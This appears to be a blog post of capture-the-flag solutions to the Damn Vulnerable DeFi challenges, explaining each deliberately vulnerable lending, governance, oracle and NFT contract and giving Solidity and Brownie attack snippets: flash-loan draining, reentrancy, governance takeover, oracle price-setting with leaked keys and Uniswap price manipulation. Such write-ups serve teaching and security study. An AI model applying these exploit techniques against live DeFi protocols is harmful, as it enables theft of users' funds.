<h1 id="damn-vulnerable-defi-solutions-brownie">Damn Vulnerable DeFi solutions (Brownie)</h1>
<div class="date">
  <span class="smaller"><b>October 25th, 2022</b></span>
</div>
<div class="centerPosition"><hr></div>
<p>This article is a collection of my solutions to the Damn Vulnerable DeFi challenges. In this article I will basically copy-paste all my solution write-ups from the <a href="https://github.com/dreth/Damn-Vulnerable-DeFi-Brownie-Solutions">github repo</a> where my solutions and scripts are.</p>
<p>I used Brownie tests to solve it just like in the original challenges which use JS+Hardhat, but using Brownie+Hardhat and Brownie+Anvil.</p>
<p>If you want to reproduce the same environment I used for it, you can clone the <a href="https://github.com/dreth/Damn-Vulnerable-DeFi-Brownie">repo I made as a clean slate</a> to solve the challenges with Brownie. It took a while to adapt them, but it was a really fun challenge.</p>
<hr>
<h2 id="article-index">Article index</h2>
<ul>
<li><a href="#unstoppable">Unstoppable</a>
<ul>
<li><a href="#challenge-description">Challenge description</a></li>
<li><a href="#solution">Solution</a></li>
</ul>
</li>
<li><a href="#naive-receiver">Naive receiver</a>
<ul>
<li><a href="#challenge-description-1">Challenge description</a></li>
<li><a href="#solution-1">Solution</a></li>
</ul>
</li>
<li><a href="#truster">Truster</a>
<ul>
<li><a href="#challenge-description-2">Challenge description</a></li>
<li><a href="#solution-2">Solution</a></li>
</ul>
</li>
<li><a href="#side-entrance">Side entrance</a>
<ul>
<li><a href="#challenge-description-3">Challenge description</a></li>
<li><a href="#solution-3">Solution</a></li>
</ul>
</li>
<li><a href="#the-rewarder">The rewarder</a>
<ul>
<li><a href="#challenge-description-4">Challenge description</a></li>
<li><a href="#solution-4">Solution</a></li>
</ul>
</li>
<li><a href="#selfie">Selfie</a>
<ul>
<li><a href="#challenge-description-5">Challenge description</a></li>
<li><a href="#solution-5">Solution</a></li>
</ul>
</li>
<li><a href="#compromised">Compromised</a>
<ul>
<li><a href="#challenge-description-6">Challenge description</a></li>
<li><a href="#solution-6">Solution</a></li>
</ul>
</li>
<li><a href="#puppet">Puppet</a>
<ul>
<li><a href="#challenge-description-7">Challenge description</a></li>
<li><a href="#solution-7">Solution</a></li>
</ul>
</li>
<li><a href="#puppet-v2">Puppet V2</a>
<ul>
<li><a href="#challenge-description-8">Challenge description</a></li>
<li><a href="#solution-8">Solution</a></li>
</ul>
</li>
<li><a href="#free-rider">Free rider</a>
<ul>
<li><a href="#challenge-description-9">Challenge description</a></li>
<li><a href="#solution-9">Solution</a></li>
</ul>
</li>
<li><a href="#backdoor">Backdoor</a>
<ul>
<li><a href="#challenge-description-10">Challenge description</a></li>
<li><a href="#solution-10">Solution</a></li>
</ul>
</li>
<li><a href="#climber">Climber</a>
<ul>
<li><a href="#challenge-description-11">Challenge description</a></li>
<li><a href="#solution-11">Solution</a></li>
<li><a href="#extras">Extras</a></li>
</ul>
</li>
</ul>
<hr>
<h2 id="unstoppable">Unstoppable</h2>
<h3 id="challenge-description">Challenge description</h3>
<blockquote>
<p>There’s a lending pool with a million DVT tokens in balance, offering flash loans for free.</p>
<p>If only there was a way to attack and stop the pool from offering flash loans …</p>
<p>You start with 100 DVT tokens in balance.</p>
</blockquote>
<h3 id="solution">Solution</h3>
<p>There’s a bug in the UnstoppableLender contract which can be exploited to prevent new flash loans from being offered.</p>
<p>Line 37 in the <code>flashLoan()</code> function checks for the current contract token balance:</p>
<pre class=" language-cs"><code class="prism  language-cs">uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
</code></pre>
<p>This checks for the <em>real token balance in the contract</em>. But then, the contract compares it with the variable <code>poolBalance</code>:</p>
<pre class=" language-cs"><code class="prism  language-cs">assert(poolBalance == balanceBefore);
</code></pre>
<p><code>poolBalance</code> can only increase if a deposit is made through the <code>depositTokens</code> function:</p>
<pre class=" language-cs"><code class="prism  language-cs">poolBalance = poolBalance + amount;
</code></pre>
<p>But the actual token balance of the contract can be changed by simply sending tokens to it. And the pool contract has no way of getting rid of these tokens.</p>
<p>If we send 1 token unit to the contract, it will no longer be able to concede any flash loans, as the assertion will always fail.</p>
<hr>
<h2 id="naive-receiver">Naive receiver</h2>
<h3 id="challenge-description-1">Challenge description</h3>
<blockquote>
<p>There’s a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.</p>
<p>You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.</p>
<p>Drain all ETH funds from the user’s contract. Doing it in a single transaction is a big plus ;)</p>
</blockquote>
<h3 id="solution-1">Solution</h3>
<p>The receiver contract will forward <code>amountToBeRepaid</code> to the pool, which includes the pool fee:</p>
<pre class=" language-cs"><code class="prism  language-cs">uint256 amountToBeRepaid = msg.value + fee;
</code></pre>
<p>And the pool will always charge a fixed fee of 1 ETH in <code>flashLoan()</code>:</p>
<pre class=" language-cs"><code class="prism  language-cs">require(
    address(this).balance &gt;= balanceBefore + FIXED_FEE,
    "Flash loan hasn't been paid back"
);
</code></pre>
<p>Given that the <code>receiveEther()</code> function does not check for a <code>msg.value</code> and that the contract doesn’t check that <code>tx.origin</code> comes from the deployer of the receiver contract (whoever owns it), it is possible to drain its balance and send it to the pool in either 10 transactions with a <code>borrowAmount</code> of 0 wei or in one transaction in a short contract which performs a loop:</p>
<pre class=" language-cs"><code class="prism  language-cs">function attack() public {
    for (uint8 i = 0; i &lt; 10; i++) {
        naiveReceiverPool.flashLoan(address(naiveReceiver), 0);
    }
}
</code></pre>
<hr>
<h2 id="truster">Truster</h2>
<h3 id="challenge-description-2">Challenge description</h3>
<blockquote>
<p>More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.</p>
<p>Currently the pool has 1 million DVT tokens in balance. And you have nothing.</p>
<p>But don’t worry, you might be able to take them all from the pool. In a single transaction.</p>
</blockquote>
<h3 id="solution-2">Solution</h3>
<p>After the TrusterLenderPool transfers borrowed tokens to the borrower, it runs the following call to a specified <code>target</code> contract which is supposed to perform certain actions in behalf of the borrower (as the borrower programs it) with the tokens and is supposed to return the tokens back into the pool:</p>
<pre class=" language-cs"><code class="prism  language-cs">target.functionCall(data);
</code></pre>
<p>However, there is no restriction as to which contract can be passed as <code>target</code>, therefore we can pass any contract address, including that of the DVT token contract.</p>
<p>The way I chose to solve this challenge is by passing the DVT token contract and calling <code>approve()</code> passing the attacker address as spender and with <code>TOKENS_IN_POOL</code> as the spending limit.</p>
<p>After the approval, I drained all the pool funds by calling <code>transferFrom()</code>.</p>
<hr>
<h2 id="side-entrance">Side entrance</h2>
<h3 id="challenge-description-3">Challenge description</h3>
<blockquote>
<p>A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.</p>
<p>This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.</p>
<p>You must take all ETH from the lending pool.</p>
</blockquote>
<h3 id="solution-3">Solution</h3>
<p>SideEntranceLenderPool’s <code>flashLoan()</code> function expects to interact with a contract and call its <code>execute</code> function forwarding the value that the borrower requests (<code>amount</code>). This contract is open to reentrancy vulnerabilities and it can be exploited to drain its funds.</p>
<p>Then, the <code>flashLoan()</code> function checks the following:</p>
<pre class=" language-cs"><code class="prism  language-cs">require(address(this).balance &gt;= balanceBefore, "Flash loan hasn't been paid back"); 
</code></pre>
<p>Meaning the funds can be returned to the contract through <code>deposit()</code>:</p>
<pre class=" language-cs"><code class="prism  language-cs">function execute() external payable {
    pool.deposit{value: msg.value}();
}
</code></pre>
<p>Given the reentrancy vulnerability, we can call <code>deposit()</code> in <code>execute()</code> with the funds obtained from the flash loan, which credits them to the attacker contract address in the <code>balances</code> mapping.</p>
<p>This entitles the attacker contract to withdrawing the full pool contract balance, which can be then forwarded to the attacker address:</p>
<pre class=" language-cs"><code class="prism  language-cs">function withdrawFromPool() external payable {
    pool.withdraw();
}

receive() external payable {
    payable(owner).sendValue(msg.value);
}
</code></pre>
<hr>
<h2 id="the-rewarder">The rewarder</h2>
<h3 id="challenge-description-4">Challenge description</h3>
<blockquote>
<p>There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.</p>
<p>Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!</p>
<p>You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.</p>
<p>Oh, by the way, rumours say a new pool has just landed on mainnet. Isn’t it offering DVT tokens in flash loans?</p>
</blockquote>
<h3 id="solution-4">Solution</h3>
<p>The TheRewarderPool mints reward tokens every time it calls <code>distributeRewards()</code> and the user has an amount of rewards larger than 0, which is computed as follows:</p>
<pre class=" language-cs"><code class="prism  language-cs">rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;
</code></pre>
<p>To claim such rewards, <code>isNewRewardsRound()</code> has to return <code>true</code>. The only way this can happen is if it’s been 5 days since the last snapshot was taken.</p>
<p>What we have to do here is deploy an attacker contract that can perform the following steps, this all has to be done <em>twice</em>, both times after waiting 5 days<sup><b>*</b></sup>:</p>
<ul>
<li>Take a loan from the flash loaner pool of a large amount of tokens, ideally all of them:</li>
</ul>
<pre class=" language-cs"><code class="prism  language-cs">flashLoanerPool.flashLoan(IERC20(pool.liquidityToken()).balanceOf(address(flashLoanerPool)));
</code></pre>
<p>Then, in its <code>receiveFlashLoan()</code> function:</p>
<ul>
<li>Approve the spending limit of the liquidity token to equal the amount borrowed from the flash loaner pool:</li>
</ul>
<pre class=" language-cs"><code class="prism  language-cs">IERC20(pool.liquidityToken()).approve(address(pool), amount);
</code></pre>
<ul>
<li>Deposit the tokens and then withdraw them. This will call <code>distributeRewards()</code> on deposit, which will send the attacker contract all the reward tokens that correspond to it</li>
</ul>
<pre class=" language-cs"><code class="prism  language-cs">pool.deposit(amount);
pool.withdraw(amount);
</code></pre>
<ul>
<li>Return the tokens to the flash loaner pool</li>
</ul>
<pre class=" language-cs"><code class="prism  language-cs">IERC20(pool.liquidityToken()).transfer(address(flashLoanerPool), amount);
</code></pre>
<ul>
<li>Transfer all tokens to the attacker address, which I set up as <code>owner</code> during deployment</li>
</ul>
<pre class=" language-cs"><code class="prism  language-cs">IERC20(pool.rewardToken()).transfer(address(owner), IERC20(pool.rewardToken()).balanceOf(address(this)));
</code></pre>
<p><sup><b>*</b></sup> Since the challenge is designed to work on a local testnet, I believe it to be acceptable to run a command like <code>evm_increaseTime</code>, however, if this were on a live network, we would have a window of time to run the <code>distributeRewards()</code> after calling <code>deposit()</code> with a really large amount of tokens in order to skew rewards so much that we essentially capture almost all of them when <code>distributeRewards()</code> is called and <code>isNewRewardsRound()</code> returns <code>true</code>. The attacker contract needs to be the <em>first</em> address that calls <code>distributeRewards()</code> because it is called <em>during</em> the transaction in which the attacker contract has all the borrowed funds from the flash loan, if anyone <em>else</em> calls <code>distributeRewards()</code> before the flash loan is taken or after it’s returned, the reward tokens are correctly distributed.</p>
<hr>
<h2 id="selfie">Selfie</h2>
<h3 id="challenge-description-5">Challenge description</h3>
<blockquote>
<p>A new cool lending pool has launched! It’s now offering flash loans of DVT tokens.</p>
<p>Wow, and it even includes a really fancy governance mechanism to control it.</p>
<p>What could go wrong, right ?</p>
<p>You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.</p>
</blockquote>
<h3 id="solution-5">Solution</h3>
<p>For this challenge, there’s a pool offering flash loans and a simple governance contract which has privileges to call functions in the pool contract which are locked by a modifier (<code>onlyGovernance()</code>) which require the caller to be the governance contract.</p>
<p>In order to bypass this, we have to be able to propose and execute governance proposals. Anyone can execute a governance proposal in due time if the conditions in <code>_canBeExecuted()</code> for a specific <code>actionId</code> are met. In this case there’s a requirement to wait 2 days after proposing it and before executing it, and the action must not have already been executed (<code>actionToExecute.executedAt == 0</code>).</p>
<p>An account is also only allowed to make proposals if it holds at least half of the total supply of the token plus 1 (<em>yay decentralization?</em> or something like that)</p>
<p>After all these requirements are passed, we can call an <code>onlyGovernance()</code> gated function called <code>drainAllFunds()</code> in SelfiePool, and pass which address we want to send all the funds to.</p>
<p>Given that SelfiePool offers loans in exactly the same token that is required to make governance proposals, I did the following to successfully drain all funds:</p>
<p>First deploy an attacker contract which can take loans from the pool:</p>
<pre class=" language-cs"><code class="prism  language-cs">function takeLoan() public {
    // execute a flash loan borrowing all available DVT tokens in the pool
    pool.flashLoan(fundsInPool);
}
</code></pre>
<p>Where <code>fundsInPool</code> is a variable set by the constructor of the contract which obtains the entire balance of DVT tokens in the SelfiePool.</p>
<p>The attacker contract must contain a <code>receiveTokens()</code> function which takes a snapshot of the token balance:</p>
<pre class=" language-cs"><code class="prism  language-cs">token.snapshot();
</code></pre>
<p>Then queues a governance action with some calldata which executes <code>drainAllFunds()</code> with the attacker address as parameter:</p>
<pre class=" language-cs"><code class="prism  language-cs">maliciousAction = governance.queueAction(address(pool), attackData, 0);
</code></pre>
<p>Where <code>attackData</code> is such calldata.</p>
<p>After these two actions, the contract should return the borrowed funds back to the pool:</p>
<pre class=" language-cs"><code class="prism  language-cs">token.transfer(address(pool), amount);
</code></pre>
<p>After deploying the attacker contract, I generated the calldata for the <code>drainAllFunds()</code> function and set it to the <code>attackData</code> state variable in the attacker contract.</p>
<p>Call the function in the attacker contract that takes the loan, which executes the actions in <code>receiveTokens()</code>, those described in step 1.</p>
<p>Wait 2 days using the rpc <code>evm_increaseTime</code> request (acceptable as it’s a testnet environment, in the real world 2 days have to pass)</p>
<p>Execute the governance action calling <code>executeAction()</code> with the corresponding <code>actionId</code>.</p>
<p>This will drain the funds and transfer them to the attacker address.</p>
<hr>
<h2 id="compromised">Compromised</h2>
<h3 id="challenge-description-6">Challenge description</h3>
<blockquote>
<p>While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:</p>
</blockquote>
<pre><code>HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 
30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 
55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 
47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 
4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 
68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 
68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 
55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 
32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 
4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 
33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
</code></pre>
<blockquote>
<p>A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each</p>
<p>This price is fetched from an on-chain oracle, and is based on three trusted reporters:<br>
<code>0xA73209FB1a42495120166736362A1DfA9F95A105</code><br>
<code>0xe92401A4d3af5E446d93D11EEc806b1462b39D15</code><br>
<code>0x81A5D6E50C214044bE44cA0CB057fe119097850c</code></p>
<p>Starting with only 0.1 ETH in balance, you must steal all ETH available in the exchange.</p>
</blockquote>
<h3 id="solution-6">Solution</h3>
<p>The server response has 2 long strings which when decoded as a string as suggested by the headers, they return the following:</p>
<pre><code>MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
</code></pre>
<pre><code>MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
</code></pre>
<p>These look like base64 strings, which we can further decode into:</p>
<pre><code>0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
</code></pre>
<pre><code>0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
</code></pre>
<p>When trying these out as private keys, we obtain the private keys for the last two addresses in the <code>sources</code> list, which are the EOAs allowed to post prices to the oracle.</p>
<p>Now that we can use these addresses, we can call <code>postPrice()</code> for the “DVNFT” NFTs:</p>
<pre class=" language-python"><code class="prism  language-python">oracle<span class="token punctuation">.</span>postPrice<span class="token punctuation">(</span><span class="token string">"DVNFT"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span> _fromLeakedAcc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
oracle<span class="token punctuation">.</span>postPrice<span class="token punctuation">(</span><span class="token string">"DVNFT"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span> _fromLeakedAcc<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre>
<p>After posting 0 for each of them, the median price returned by <code>getMedianPrice()</code> will return 0, as the median of <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">{</mo><mn>990</mn><mo separator="true">,</mo><mn>0</mn><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{990, 0, 0\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">{</span><span class="mord">990</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mord">0</span><span class="mclose">}</span></span></span></span></span> is <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">0</span></span></span></span></span>.</p>
<p>We can then use the attacker account to buy one of these NFTs for 1 wei. We need to send at least 1 wei when buying, as requested by the <code>buyOne()</code> function:</p>
<pre class=" language-cs"><code class="prism  language-cs">uint256 amountPaidInWei = msg.value;
require(amountPaidInWei &gt; 0, "Amount paid must be greater than zero");
</code></pre>
<p>After obtaining the NFT, we can post a new price corresponding to the entire balance of the NFT exchange:</p>
<pre class=" language-python"><code class="prism  language-python">oracle<span class="token punctuation">.</span>postPrice<span class="token punctuation">(</span><span class="token string">"DVNFT"</span><span class="token punctuation">,</span> exchange<span class="token punctuation">.</span>balance<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _fromLeakedAcc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
oracle<span class="token punctuation">.</span>postPrice<span class="token punctuation">(</span><span class="token string">"DVNFT"</span><span class="token punctuation">,</span> exchange<span class="token punctuation">.</span>balance<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _fromLeakedAcc<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre>
<p>Then we must approve the token to be taken from the attacker wallet by the exchange calling <code>approve()</code> with the ID of our NFT (<code>0</code>):</p>
<pre class=" language-py"><code class="prism  language-py">nft_token<span class="token punctuation">.</span>approve<span class="token punctuation">(</span>exchange<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _fromAttacker<span class="token punctuation">)</span>
</code></pre>
<p>Then we sell the token calling <code>sellOne()</code> with the token ID:</p>
<pre class=" language-py"><code class="prism  language-py">exchange<span class="token punctuation">.</span>sellOne<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> _fromAttacker<span class="token punctuation">)</span>
</code></pre>
<p>And then we return the price to normal, as requested by the challenge:</p>
<pre class=" language-py"><code class="prism  language-py">oracle<span class="token punctuation">.</span>postPrice<span class="token punctuation">(</span><span class="token string">"DVNFT"</span><span class="token punctuation">,</span>ether_to_wei<span class="token punctuation">(</span><span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _fromLeakedAcc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
oracle<span class="token punctuation">.</span>postPrice<span class="token punctuation">(</span><span class="token string">"DVNFT"</span><span class="token punctuation">,</span>ether_to_wei<span class="token punctuation">(</span><span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _fromLeakedAcc<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre>
<hr>
<h2 id="puppet">Puppet</h2>
<h3 id="challenge-description-7">Challenge description</h3>
<blockquote>
<p>There’s a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.</p>
<p>There’s a DVT market opened in an Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.</p>
<p>Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool.</p>
</blockquote>
<h3 id="solution-7">Solution</h3>
<p>For this challenge there’s a huge vulnerability in the PuppetPool contract where it only computes the price of the token from one source, the Uniswap V1 pool of DVT/ETH tokens.</p>
<p>If there’s only one price source, the source can be easily manipulated, as we have 100 times more tokens than the Uniswap V1 pool, thus allowing us to push the price way down, to the point where it’s possible to drain almost all the ETH in the uniswap pool.</p>
<p>To solve the challenge, first we have to approve the tokens for trade on the Uniswap V1 pool of DVT/ETH tokens:</p>
<pre class=" language-python"><code class="prism  language-python">token<span class="token punctuation">.</span>approve<span class="token punctuation">(</span>
    uniswap_exchange<span class="token punctuation">.</span>address<span class="token punctuation">,</span> 
    <span class="token number">2</span><span class="token operator">**</span><span class="token number">256</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> 
    _fromAttacker
<span class="token punctuation">)</span>
</code></pre>
<p>Here I used a pseudo-infinite approval (usually just called infinite approvals in DeFi), though this is not really necessary.</p>
<p>Then drain the pool of as much ETH as we can get in order to push the price of DVT tokens to as low as we can get it:</p>
<pre class=" language-python"><code class="prism  language-python">uniswap_exchange<span class="token punctuation">.</span>tokenToEthSwapOutput<span class="token punctuation">(</span>
    ether_to_wei<span class="token punctuation">(</span><span class="token number">9.9</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
    ether_to_wei<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
    web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>get_block<span class="token punctuation">(</span><span class="token string">'latest'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>timestamp <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">,</span> 
    _fromAttacker
<span class="token punctuation">)</span>
</code></pre>
<p>Then calculate the required deposit of ETH in order to borrow <em>all</em> the tokens in the lending pool by calling <code>calculateDepositRequired()</code>:</p>
<pre class=" language-python"><code class="prism  language-python">deposit_required <span class="token operator">=</span> lending_pool<span class="token punctuation">.</span>calculateDepositRequired<span class="token punctuation">(</span>ether_to_wei<span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>And finally, borrow all the tokens sending the value required assigned to the <code>deposit_required</code> variable:</p>
<pre class=" language-python"><code class="prism  language-python">lending_pool<span class="token punctuation">.</span>borrow<span class="token punctuation">(</span>
    ether_to_wei<span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
    _fromAttacker <span class="token operator">|</span> value_dict<span class="token punctuation">(</span>deposit_required<span class="token punctuation">)</span>
<span class="token punctuation">)</span> 
</code></pre>
<p>This will effectively take all the tokens in the lending pool.</p>
<hr>
<h2 id="puppet-v2">Puppet V2</h2>
<h3 id="challenge-description-8">Challenge description</h3>
<blockquote>
<p>The developers of the last lending pool are saying that they’ve learned the lesson. And just released a new version!</p>
<p>Now they’re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.</p>
<p>You start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;)</p>
</blockquote>
<h3 id="solution-8">Solution</h3>
<p>This challenge is <em>identical</em> to the puppet challenge, except it uses Uniswap V2. Once again, we can manipulate the price of the token by selling a bunch of DVT tokens for ETH, which reduces the price of DVT tokens relative to ETH so much that it’s possible to borrow the entire token balance of the PuppetV2Pool pool.</p>
<p>The only added change here is that Uniswap V2 only performs token to token swaps, where ETH must be wrapped as WETH (an ERC20 token 1:1 with ETH).</p>
<p>The steps to perform the attack are really similar to those of the Puppet challenge:</p>
<p>First we must approve the token spending limit for the Uniswap V2 router:</p>
<pre class=" language-py"><code class="prism  language-py">token<span class="token punctuation">.</span>approve<span class="token punctuation">(</span>uniswap_router<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">256</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> _fromAttacker<span class="token punctuation">)</span>
</code></pre>
<p>Then exchange all the tokens in our wallet for ETH:</p>
<pre class=" language-py"><code class="prism  language-py">uniswap_router<span class="token punctuation">.</span>swapExactTokensForETH<span class="token punctuation">(</span>
    ether_to_wei<span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
    <span class="token number">9.92</span><span class="token punctuation">,</span> 
    <span class="token punctuation">[</span>token<span class="token punctuation">.</span>address<span class="token punctuation">,</span> weth<span class="token punctuation">.</span>address<span class="token punctuation">]</span><span class="token punctuation">,</span>
    attacker<span class="token punctuation">.</span>address<span class="token punctuation">,</span>
    web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>get_block<span class="token punctuation">(</span><span class="token string">'latest'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>timestamp <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">,</span>
    _fromAttacker
<span class="token punctuation">)</span>
</code></pre>
<p><code>swapTokensForExactTokens()</code> can also be used, as we’re going to use WETH anyway, but we would have to wrap some extra ETH to reach the right amount to drain the pool anyway, so I decided to just use <code>swapExactTokensForETH()</code>.</p>
<p>Then obtain what amount of WETH we must deposit to drain the pool:</p>
<pre class=" language-py"><code class="prism  language-py">amount <span class="token operator">=</span> lending_pool<span class="token punctuation">.</span>calculateDepositOfWETHRequired<span class="token punctuation">(</span>POOL_INITIAL_TOKEN_BALANCE<span class="token punctuation">)</span>
</code></pre>
<p>Deposit this same amount into the WETH contract:</p>
<pre class=" language-py"><code class="prism  language-py">weth<span class="token punctuation">.</span>deposit<span class="token punctuation">(</span>_fromAttacker <span class="token operator">|</span> value_dict<span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>Now with the WETH in hand we must approve the spending limit of WETH for the PuppetV2Pool contract to the <code>amount</code> obtained before (or more):</p>
<pre class=" language-py"><code class="prism  language-py">weth<span class="token punctuation">.</span>approve<span class="token punctuation">(</span>lending_pool<span class="token punctuation">.</span>address<span class="token punctuation">,</span> amount<span class="token punctuation">,</span> _fromAttacker<span class="token punctuation">)</span>
</code></pre>
<p>Given that the PuppetV2Pool calls <code>transferFrom()</code> in <code>borrow()</code>:</p>
<pre class=" language-cs"><code class="prism  language-cs">_weth.transferFrom(msg.sender, address(this), depositOfWETHRequired);
</code></pre>
<p>Then just call borrow to drain the pool:</p>
<pre class=" language-py"><code class="prism  language-py">lending_pool<span class="token punctuation">.</span>borrow<span class="token punctuation">(</span>POOL_INITIAL_TOKEN_BALANCE<span class="token punctuation">,</span> _fromAttacker<span class="token punctuation">)</span>
</code></pre>
<p>And we should receive all the DVT tokens from the pool.</p>
<hr>
<h2 id="free-rider">Free rider</h2>
<h3 id="challenge-description-9">Challenge description</h3>
<blockquote>
<p>A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.</p>
<p>A buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn’t know how to do it. So it’s offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.</p>
<p>You want to build some rep with this buyer, so you’ve agreed with the plan.</p>
<p>Sadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant.</p>
</blockquote>
<h3 id="solution-9">Solution</h3>
<p>The FreeRiderNFTMarketplace contract has a vulnerability in <code>_buyOne()</code> where <code>msg.value</code> is checked and compared to the price of the NFTs which we want to bulk buy through <code>buyMany()</code>. However, the comparison is <em>individually</em> made for <em>each</em> NFT we try to purchase with <code>buyMany()</code>. This opens up the possibility of buying <em>all</em> NFTs we order for the price of the <em>highest</em> one alone, making all others free.</p>
<p>In this case, we can exploit this by sending 15 ether, which ends up covering for <em>all</em> of them (as opposed to 15 * 6 = 90 ether), thereby netting us +75 ether.</p>
<p>To exploit this, we first need to code a contract, as it’s the only way to take the flash loan from uniswap.</p>
<p>The attacker contract should have a function which calls the <code>swap()</code> function and routes its internal <code>uniswapV2Call()</code> call to a function inside of our contract, so we must override the <code>uniswapV2Call()</code> function imported from the IUniswapV2Callee interface.</p>
<p>In my case, since we only need WETH, I made the <code>flashSwap()</code> function only take amounts of WETH in count:</p>
<pre class=" language-cs"><code class="prism  language-cs">function flashSwap(uint256 _amount) external {
    // we want to specifically borrow weth
    uint256 amount0 = pair.token0() == weth ? _amount : 0;
    uint256 amount1 = pair.token1() == weth ? _amount : 0;
    
    // encoded data for `swap` to understand it's a flashloan and not just a swap
    bytes memory data = abi.encode(weth, _amount);
    pair.swap(amount0, amount1, address(this), data);
}
</code></pre>
